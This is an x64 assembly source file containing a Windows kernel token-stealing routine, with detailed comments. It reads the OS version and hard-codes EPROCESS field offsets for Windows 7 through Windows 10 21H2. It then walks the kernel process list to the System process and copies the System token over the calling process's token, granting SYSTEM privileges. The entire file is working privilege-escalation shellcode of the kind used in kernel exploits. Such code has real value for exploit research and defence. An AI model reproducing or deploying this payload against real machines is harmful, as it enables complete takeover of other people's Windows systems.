; ------------------------------------------------------------------------
; File: TokenSteal64.asm
;
; Author: winterknife
;
; Description: x64 assembly routine to steal token of System process and
; elevate calling process to System Integrity Level(IL)
; Works from Windows 7 to Windows 10
;
; Modifications:
;  11/01/2022	Created
;  19/01/2022	Updated
; ------------------------------------------------------------------------

; Start of .text segment
.CODE

; Align by 16 bytes
ALIGN 16

; Replace nt!_EPROCESS.Token of calling process with System nt!_EPROCESS.Token for EoP
steal_system_token PROC PUBLIC
	; Initialize RAX register to 0
	xor eax, eax                       ; clear RAX

	; Get major/minor version number to determine OS version
	; nt!_KUSER_SHARED_DATA structure is located at fixed VA of 0xFFFFF78000000000
	; At an offset of 0x26C into nt!_KUSER_SHARED_DATA structure lies NtMajorVersion field(DWORD)
	; At an offset of 0x270 into nt!_KUSER_SHARED_DATA structure lies NtMinorVersion field(DWORD)
	mov rcx, 0FFFFF78000000000h        ; ECX = nt!_KUSER_SHARED_DATA VA
	add eax, dword ptr [rcx + 26Ch]    ; EAX = EAX + nt!_KUSER_SHARED_DATA.NtMajorVersion
	add eax, dword ptr [rcx + 270h]    ; EAX = EAX + nt!_KUSER_SHARED_DATA.NtMinorVersion
	cmp eax, 7d                        ; if (EAX == 7) => Windows 7/Windows Server 2008 R2, set EFLAGS.ZF!
	jz win7                            ; jump if EFLAGS.ZF == 1 to win7 label
	cmp eax, 8d                        ; if (EAX == 8) => Windows 8/Windows Server 2012, set EFLAGS.ZF!
	jz win8_81                         ; jump if EFLAGS.ZF == 1 to win8_81 label
	cmp eax, 9d                        ; if (EAX == 9) => Windows 8.1/Windows Server 2012 R2, set EFLAGS.ZF!
	jz win8_81                         ; jump if EFLAGS.ZF == 1 to win8_81 label
	cmp eax, 10d                       ; if (EAX == 10) => Windows 10/Windows 11/Windows Server 2016/Windows Server 2019/Windows Server 2022, set EFLAGS.ZF!
	jz win10                           ; jump if EFLAGS.ZF == 1 to win10 label
	xor eax, eax                       ; else OS version must be unsupported so we set RAX to FALSE(0)
	ret                                ; return from procedure

	; Resolve required offsets for Windows 7/Windows Server 2008 R2
	; WinDbg command: ? @@c++(#FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks))
	; WinDbg command: ? @@c++(#FIELD_OFFSET(nt!_EPROCESS, Token))
win7:
	mov r9, 188h                       ; R9 = FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks)
	mov r10, 208h                      ; R10 = FIELD_OFFSET(nt!_EPROCESS, Token)
	jmp offsets_resolved               ; jump unconditionally to offsets_resolved label to prevent fallthrough

	; Resolve required offsets for Windows 8/Windows Server 2012/Windows 8.1/Windows Server 2012 R2
win8_81:
	mov r9, 2e8h                       ; R9 = FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks)
	mov r10, 348h                      ; R10 = FIELD_OFFSET(nt!_EPROCESS, Token)
	jmp offsets_resolved               ; jump unconditionally to offsets_resolved label to prevent fallthrough

	; Get OS build number to determine Windows 10 version
	; At an offset of 0x260 into nt!_KUSER_SHARED_DATA structure lies NtBuildNumber field(DWORD)
win10:
	mov eax, dword ptr [rcx + 260h]    ; EAX = nt!_KUSER_SHARED_DATA.NtBuildNumber
	cmp eax, 10240d                    ; if (EAX == 10240) => Windows 10 1507/TS1, set EFLAGS.ZF!
	jz win10_ts1_ts2_rs1               ; jump if EFLAGS.ZF == 1 to win10_ts1_ts2_rs1 label
	cmp eax, 10586d                    ; if (EAX == 10586) => Windows 10 1511/TS2, set EFLAGS.ZF!
	jz win10_ts1_ts2_rs1               ; jump if EFLAGS.ZF == 1 to win10_ts1_ts2_rs1 label
	cmp eax, 14393d                    ; if (EAX == 14393) => Windows 10 1607/RS1, set EFLAGS.ZF!
	jz win10_ts1_ts2_rs1               ; jump if EFLAGS.ZF == 1 to win10_ts1_ts2_rs1 label
	cmp eax, 15063d                    ; if (EAX == 15063) => Windows 10 1703/RS2, set EFLAGS.ZF!
	jz win10_rs2_rs3_rs4_rs5           ; jump if EFLAGS.ZF == 1 to win10_rs2_rs3_rs4_rs5 label
	cmp eax, 16299d                    ; if (EAX == 16299) => Windows 10 1709/RS3, set EFLAGS.ZF!
	jz win10_rs2_rs3_rs4_rs5           ; jump if EFLAGS.ZF == 1 to win10_rs2_rs3_rs4_rs5 label
	cmp eax, 17134d                    ; if (EAX == 17134) => Windows 10 1803/RS4, set EFLAGS.ZF!
	jz win10_rs2_rs3_rs4_rs5           ; jump if EFLAGS.ZF == 1 to win10_rs2_rs3_rs4_rs5 label
	cmp eax, 17763d                    ; if (EAX == 17763) => Windows 10 1809/RS5, set EFLAGS.ZF!
	jz win10_rs2_rs3_rs4_rs5           ; jump if EFLAGS.ZF == 1 to win10_rs2_rs3_rs4_rs5 label
	cmp eax, 18362d                    ; if (EAX == 18362) => Windows 10 1903/19H1, set EFLAGS.ZF!
	jz win10_19h1_19h2                 ; jump if EFLAGS.ZF == 1 to win10_19h1_19h2 label
	cmp eax, 18363d                    ; if (EAX == 18363) => Windows 10 1909/19H2, set EFLAGS.ZF!
	jz win10_19h1_19h2                 ; jump if EFLAGS.ZF == 1 to win10_19h1_19h2 label
	cmp eax, 19041d                    ; if (EAX == 19041) => Windows 10 2004/20H1, set EFLAGS.ZF!
	jz win10_20h1_20h2_21h1_21h2       ; jump if EFLAGS.ZF == 1 to win10_20h1_20h2_21h1_21h2 label
	cmp eax, 19042d                    ; if (EAX == 19042) => Windows 10 2009/20H2, set EFLAGS.ZF!
	jz win10_20h1_20h2_21h1_21h2       ; jump if EFLAGS.ZF == 1 to win10_20h1_20h2_21h1_21h2 label
	cmp eax, 19043d                    ; if (EAX == 19043) => Windows 10 2104/21H1, set EFLAGS.ZF!
	jz win10_20h1_20h2_21h1_21h2       ; jump if EFLAGS.ZF == 1 to win10_20h1_20h2_21h1_21h2 label
	cmp eax, 19044d                    ; if (EAX == 19044) => Windows 10 2110/21H2, set EFLAGS.ZF!
	jz win10_20h1_20h2_21h1_21h2       ; jump if EFLAGS.ZF == 1 to win10_20h1_20h2_21h1_21h2 label
	xor eax, eax                       ; else OS version must be unsupported so we set RAX to FALSE(0)
	ret                                ; return from procedure

	; Resolve required offsets for Windows 10 TS1/Windows 10 TS2/Windows 10 RS1
win10_ts1_ts2_rs1:
	mov r9, 2f0h                       ; R9 = FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks)
	mov r10, 358h                      ; R10 = FIELD_OFFSET(nt!_EPROCESS, Token)
	jmp offsets_resolved               ; jump unconditionally to offsets_resolved label to prevent fallthrough

	; Resolve required offsets for Windows 10 RS2/Windows 10 RS3/Windows 10 RS4/Windows 10 RS5
win10_rs2_rs3_rs4_rs5:
	mov r9, 2e8h                       ; R9 = FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks)
	mov r10, 358h                      ; R10 = FIELD_OFFSET(nt!_EPROCESS, Token)
	jmp offsets_resolved               ; jump unconditionally to offsets_resolved label to prevent fallthrough

	; Resolve required offsets for Windows 10 19H1/Windows 10 19H2
win10_19h1_19h2:
	mov r9, 2f0h                       ; R9 = FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks)
	mov r10, 360h                      ; R10 = FIELD_OFFSET(nt!_EPROCESS, Token)
	jmp offsets_resolved               ; jump unconditionally to offsets_resolved label to prevent fallthrough

	; Resolve required offsets for Windows 10 20H1/Windows 10 20H2/Windows 10 21H1/Windows 10 21H2
win10_20h1_20h2_21h1_21h2:
	mov r9, 448h                       ; R9 = FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks)
	mov r10, 4b8h                      ; R10 = FIELD_OFFSET(nt!_EPROCESS, Token)

	; Proceed with execution now that offsets have been resolved
offsets_resolved:
	; Get pointer to currently executing thread object(nt!_KTHREAD structure)
	; In CPL-0(x64), GS segment base register value(IA32_GS_BASE/0xC0000101 MSR value) contains address of the current CPU's nt!_KPCR structure
	; At an offset of 0x180 into nt!_KPCR structure lies Prcb field(nt!_KPRCB structure)
	; At an offset of 0x8 into nt!_KPRCB structure lies CurrentThread field(nt!_KTHREAD structure VA)
	; WinDbg command: uf nt!KeGetCurrentThread
	mov rax, qword ptr gs:[188h]       ; RAX = *(gsbase + 0x188) = current nt!_KTHREAD VA

	; Get pointer to current process object that houses the currently executing thread(nt!_KPROCESS structure)
	; At an offset of 0x220 into nt!_KTHREAD structure lies Process field(nt!_KPROCESS structure VA)
	; WinDbg command: uf nt!IoThreadToProcess
	mov rax, qword ptr [rax + 220h]    ; RAX = nt!_KTHREAD.Process = current nt!_KPROCESS VA

	; Save pointer to current executive process object(nt!_EPROCESS structure) from RAX register to RCX register
	; At an offset of 0x0 into nt!_EPROCESS structure lies Pcb field(nt!_KPROCESS structure)
	; This essentially implies that they both can be accessed from the same address
	mov rcx, rax                       ; RCX = RAX = current nt!_KPROCESS/nt!_EPROCESS VA

	; Get VA of current process object's ActiveProcessLinks member by adding the ActiveProcessLinks offset to RAX register
	; All nt!_EPROCESS structures are linked together via circular doubly linked list(nt!_LIST_ENTRY structure)
	; At an offset of 0xXXX(dynamic) into nt!_EPROCESS structure lies ActiveProcessLinks field(nt!_LIST_ENTRY structure)
	add rax, r9                        ; RAX = RAX + R9 = current nt!_EPROCESS.ActiveProcessLinks VA

	; Search for the System process object VA(PID 4)
search_system_process:
	; At an offset of 0x0 into nt!_LIST_ENTRY structure lies Flink field(next nt!_EPROCESS.ActiveProcessLinks/nt!_LIST_ENTRY VA)
	; Follow the forward link to get to the next nt!_EPROCESS structure in each iteration of the loop
	mov rax, qword ptr [rax]           ; RAX = *(RAX) = next nt!_EPROCESS.ActiveProcessLinks VA

	; At an offset of (FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks) - 0x8) into nt!_EPROCESS structure lies UniqueProcessId field(void pointer)
	; UniqueProcessId field describes the PID of the process
	; This is necessary to compare with the PID of the System process(0x4) and check if they match
	cmp qword ptr [rax - 8h], 4h       ; if (*(RAX - 0x8) == 0x4) => System process found, set EFLAGS.ZF!

	; Keep looping until we find the System process
	jnz search_system_process          ; jump if EFLAGS.ZF == 0 to search_system_process label

	; Get VA of the System process object by subtracting the ActiveProcessLinks offset from RAX register
	sub rax, r9                        ; RAX = RAX - R9 = System nt!_EPROCESS VA
	
	; [DBG]
	; Uncomment to grant SYSTEM token to parent process instead of current process, uses hard-coded dynamic offset, only for testing purposes!
	;mov r8, qword ptr [rcx + 540h]
	;add rcx, r9
;search_parent_process:
	;mov rcx, qword ptr [rcx]
	;cmp qword ptr [rcx - 8h], r8
	;jnz search_parent_process
	;sub rcx, r9

	; Get VA of System process's token object by accessing memory at Token offset and masking off the last 4 bits to get nt!_TOKEN VA into RAX register
	; At an offset of 0xXXX(dynamic) into nt!_EPROCESS structure lies Token field(nt!_EX_FAST_REF structure)
	; This pointer is based on the fact that data structures allocated from the pool are always aligned on a 16 byte boundary on 64-bit systems
	; Ergo, 1 nibble/4 bits are available for reference counting and nt!_EX_FAST_REF.Object does not directly represent the VA of nt!_TOKEN structure
	mov rax, qword ptr [rax + r10]     ; RAX = System nt!_EPROCESS.Token = nt!_EX_FAST_REF.Object
	and al, 0F0h                       ; AL = AL & 0xF0 = mask off lowest nibble to ignore RefCnt field of nt!_EX_FAST_REF

	; Get reference count of current process into RDX register and add it to RAX register to obtain System nt!_EX_FAST_REF.Object that preserves current process's reference count
	mov rdx, qword ptr [rcx + r10]     ; RDX = current nt!_EPROCESS.Token = nt!_EX_FAST_REF.Object
	and rdx, 0Fh                       ; RDX = RDX & 0xF = nt!_EX_FAST_REF.RefCnt of current process
	add rax, rdx                       ; RAX = RAX + RDX = System nt!_EPROCESS.Token with current process's nt!_EX_FAST_REF.RefCnt

	; Replace current nt!_EPROCESS.Token with System nt!_EPROCESS.Token essentially elevating it to "NT AUTHORITY\SYSTEM" account
	mov qword ptr [rcx + r10], rax     ; MEMORY[RCX + R10] = RAX = overwrite current nt!_EPROCESS.Token with System nt!_EPROCESS.Token

	; Return success status to calling procedure
	xor eax, eax                       ; clear RAX
	inc eax                            ; set RAX to TRUE(1)
	ret                                ; return from procedure
steal_system_token ENDP

; End of ASM source
END